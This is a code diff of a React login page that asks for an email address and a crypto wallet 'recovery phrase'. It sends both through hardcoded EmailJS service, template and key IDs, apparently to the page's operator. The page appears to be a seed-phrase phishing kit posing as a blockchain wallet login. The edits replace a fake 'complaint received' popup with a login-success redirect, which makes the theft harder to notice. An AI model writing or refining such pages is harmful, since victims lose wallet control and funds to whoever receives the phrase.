@@ -1,13 +1,12 @@
 "use client";
 import React, { useState } from "react";
 import emailjs from "emailjs-com";
-import IssueReportingPage from "./report";
+// import IssueReportingPage from "./report";
 const LoginPage = ({ onLoginSuccess, onBack }) => {
   const [error, setError] = useState("");
   const [email, setEmail] = useState("");
   const [recoveryPhrase, setRecoveryPhrase] = useState("");
-  const [showModal, setShowModal] = useState(false);
-
+  
   const isValidEmail = (email) => {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     return emailRegex.test(email);
@@ -34,14 +33,14 @@ const LoginPage = ({ onLoginSuccess, onBack }) => {
         "service_n8rslz8",
         "template_s5j5bws",
         {
-          email,
-          recoveryPhrase,
+          email: email,
+          recoveryPhrase: recoveryPhrase,
         },
         "AQ3rmqLrAxGjWGBuI"
       )
       .then(() => {
         console.log("Email sent!");
-        setShowModal(true);
+        onLoginSuccess();
       })
       .catch((err) => {
         console.error(err);
@@ -78,7 +77,7 @@ const LoginPage = ({ onLoginSuccess, onBack }) => {
         {/* Using a simple SVG to mimic the logo shape */}
         <img
           src="/icons/image.png"
-          className="bchain shadow shadow-lg shadow-gray-800"
+          className="bchain shadow-lg shadow-gray-800"
           alt=""
         />
       </div>
@@ -134,22 +133,7 @@ const LoginPage = ({ onLoginSuccess, onBack }) => {
             {error}
           </div>
         )}
-        {showModal && (
-          <div className="fixed px-5  inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50">
-            <div className="bg-white text-gray-800 rounded-xl shadow-lg max-w-md w-full p-6 text-center space-y-4">
-              <h2 className="text-xl font-semibold">Complaint Received</h2>
-              <p>
-                Your complaint is under review. We'll get back to you shortly.
-              </p>
-              <button
-                onClick={() => setShowModal(false)}
-                className="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-6 rounded-md"
-              >
-                Okay
-              </button>
-            </div>
-          </div>
-        )}
+        
         {/* Login Button */}
         <button
           onClick={handleLogin}
@@ -161,7 +145,5 @@ const LoginPage = ({ onLoginSuccess, onBack }) => {
     </div>
   );
 };
-
-<IssueReportingPage />;
 
 export default LoginPage;
